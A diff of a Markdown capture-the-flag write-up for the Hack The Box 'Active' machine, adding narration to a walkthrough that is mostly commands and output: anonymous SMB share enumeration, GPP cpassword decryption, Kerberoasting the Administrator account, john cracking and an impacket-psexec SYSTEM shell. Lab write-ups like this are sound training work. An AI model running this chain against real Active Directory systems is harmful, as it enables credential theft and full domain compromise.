@@ -88,6 +88,8 @@ echo '10.10.10.100 active.htb' | sudo tee -a /etc/hosts
 
 #### SMB - TCP 139/445 <a href="#smb---tcp-139445" id="smb---tcp-139445"></a>
 
+`smbmap` clearly shows that I can access the `Replication` share without authentication.
+
 ```
 msplmee@kali:~$ smbmap -H 10.10.10.100     
 [+] IP: 10.10.10.100:445        Name: active.htb                                        
@@ -106,6 +108,8 @@ msplmee@kali:~$ smbmap -H 10.10.10.100
 ## User
 
 ### Replication share
+
+I use `smbmap` with the `--depth` option to show all `Replication` share files.
 
 ```apacheconf
 msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10 
@@ -195,12 +199,16 @@ msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10
         fr--r--r--             3722 Sat Jul 21 06:38:11 2018    GptTmpl.inf
 ```
 
+I see an interesting file named `Groups.xml`:
+
 ```apacheconf
 msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10 -A Groups.xml
 [+] IP: 10.10.10.100:445        Name: active.htb                                        
 [+] Starting search for files matching 'Groups.xml' on share Replication.
 [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml<?xml version="1.0" encoding="utf-8"?>
 ```
+
+It has `userName` and `cpassword` fields:
 
 {% code overflow="wrap" %}
 ```xml
@@ -210,12 +218,16 @@ msplmee@kali:~$ smbmap -H 10.10.10.100 -R Replication --depth 10 -A Groups.xml
 ```
 {% endcode %}
 
+I have the key, so I can use it to unlock the password with `gpp-decrypt`.
+
 ```apacheconf
 msplmee@kali:~$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
 ### Users share
+
+With valid credentials, I can access the SYSVOL and Users shares
 
 ```apacheconf
 msplmee@kali:~$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 
@@ -230,6 +242,8 @@ msplmee@kali:~$ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
         SYSVOL                                                  READ ONLY       Logon server share 
         Users                                                   READ ONLY
 ```
+
+When I access the Users share, it appears as the C:\users\ folder
 
 ```apacheconf
 msplmee@kali:~$ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
@@ -251,12 +265,16 @@ smb: \SVC_TGS\Desktop\> get user.txt
 getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 ```
 
+I get user.txt:
+
 ```apacheconf
 msplmee@kali:~$ cat user.txt                                                                                                                   
 d46*****************************
 ```
 
 ## Root
+
+I use `impacket-GetADUsers` to display a list of domain user accounts.
 
 ```apacheconf
 msplmee@kali:~$ impacket-GetADUsers -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
@@ -273,6 +291,8 @@ SVC_TGS                                               2018-07-18 16:14:38.402764
 
 ### Kerberoasting <a href="#kerberoasting" id="kerberoasting"></a>
 
+I use the `impacket-GetUserSPNs` to get a list of service usernames linked to regular user accounts and a ticket that I can try to crack.
+
 ```apacheconf
 msplmee@kali:~/HTB/Machine/Active$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save -outputfile GetUserSPNs.out
 Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
@@ -284,10 +304,14 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 [-] CCache file is not found. Skipping...
 ```
 
+It provides me with the ticket
+
 ```apacheconf
 msplmee@kali:~$ cat GetUserSPNs.out 
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08f8f3f260e1925899cdbc3a0cbecd34$0827c37a1febb71918dbf2741e7adaa33247a4d317a21e30b49c3b14a08775446b343c966ac36a8a255b4669055fd9119d1047f628db51c8641713fae0aa32aca9d192537f60ece4002d6236151b82bcbe66a3dd505b23fc11af32d6139d73eab0bbcacca811ca362dcca29c3f5537bb9f3a61f5f12aca0131199af2f5e48d226228fb5315f1e67276ddc71ab03221b7d72a6e3f919d5eeee784a7bf19b7b49899731f031340353aeee096c8c0b4eebcc4d3237e3e5c13f5fa726d6966c56884badbf4b43872c1053a029c8ee2e94031fbf9d7697d2766bdb807d6c83fad6a3937d8d230fd43a74d45d3f1fcbe7c557aa2bd57fc6dd351cb402cb502a1a173fd2bacb4fafc88e86dbe4c1b7d713e9c24fcd18ea46fbd967772c1cd48741ca6383365eada9e1eff7feed724c3b7ae9d45656c1db9074067c9693b27634f0dbeb4d6243bc257969c2424291fc918588a5c03a90ac8d0641870711f3f6298ad083a0081e9d1b408a34359d8dd6d64d1702101f85666cfae4664db8e83ae4d16004b3eed43e9c34c793270ab79ad745f33eb2d288d6a1247802ab5af3e6e86b600835f49e89e398cdee95f2cbfa3aeae117d994070f5dc96974863f070099825746630725768d2f9d958e687e511c3673f4a313021c0edeb4aa6ecdc42f8d0d90f963f54d20b672140c12c60ffdf2993b3a7ab51c3a7ac62d1511a6e856017b940f4a3c810702bde6568bc779070385742c281e50c25b919e3f4f01c7fe69b205af6af59c22699a2b16d2b8ff3ccb8d1bf116816ba6ab502bef44e20446af1d87b52d419acd8897dc838b9b98aaa7664d6d05554a7128feaae1631c803418788c9bcddc7e1e24a0e5238dc0783146017c770efdd65608330565c4402c09a03037f221e9176f4ee629ad2a950d4b0a377b79f0eb508338026d775bd95b65e094c10e7fe8efd6f3c83cf254befcee0755c80c895be050f168670bbfd85c5daf8805bf89a20305981864bdef2cf6579cfcf71f61b816ed2721206b2ced2cc5b5a59a6a2e59c2b36df8c754112278b589ca68f1c816acb1510f70cce9611dea371277b8bd79084b58e000038842ec7665ff5415a6db4de7db722fe56237fc77d103885f220e90f8909d8b9263a7d9c9a7bf1bf2916179760644e375c1a7a87281b469a57556a64333ec4a5640ffdf17cf81d2330c96c36592d57643c52915de8dd2a86b4895a67cc3e7de3be7c3f8a7c48c1d9282150db94cba02e42ff62
 ```
+
+The hash cracks easily with `john`
 
 ```apacheconf
 msplmee@kali:~$ john GetUserSPNs.out -w=/usr/share/wordlists/rockyou.txt 
@@ -302,6 +326,8 @@ Session completed.
 ```
 
 ### Shell
+
+I use `impacket-psexec` to get a shell.
 
 ```apacheconf
 msplmee@kali:~$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100 
@@ -320,6 +346,8 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32> whoami
 nt authority\system
 ```
+
+I get root.txt&#x20;
 
 ```sh
 C:\Users\Administrator\Desktop> more root.txt
